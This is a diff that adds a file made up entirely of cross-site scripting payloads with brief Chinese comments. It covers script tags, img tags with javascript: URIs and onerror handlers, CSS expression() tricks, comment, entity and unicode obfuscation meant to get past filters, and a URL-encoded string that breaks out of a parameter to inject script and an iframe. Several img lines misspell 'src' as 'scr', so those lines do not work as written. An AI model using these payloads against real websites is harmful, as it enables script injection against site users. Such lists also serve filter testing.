@@ -1,0 +1,17 @@
+<script>alert("跨站")</script>    (最常用）
+<img scr=javascript:alert("跨站")></img>
+<img scr="javascrip&#116&#58 alert(/跨站/)></img>
+<img scr="javas????cript:alert(/跨站/)" width=150></img> (?用tab键弄出来的空格）
+<img scr="#" onerror=alert(/跨站/)></img>
+<img scr="#" style="xss:expression(alert(/xss/));"></img>
+<img scr="#"/* */onerror=alert(/xss/) width=150></img> (/**/ 表示注释）
+<img src=vbscript:msgbox ("xss")></img>
+<style> input {left:expression (alert('xss'))}</style>
+<div style={left:expression (alert('xss'))}></div>
+<div style={left:exp/* */ression (alert('xss'))}></div>
+<div style={left:\0065\0078ression (alert('xss'))}></div>
+html 实体 <div style={left:&#ｘ0065；xpression (alert('xss'))}></div>
+unicode <div style="{left:expRessioN (alert('xss'))}">
+
+"]}%3Cscript%3Ealert('我又来啦！.')%3C/script%3E{[&item="]<iframe%20src=WWW.BAIDU.COM%20width=400%20height=600></iframe>["
+
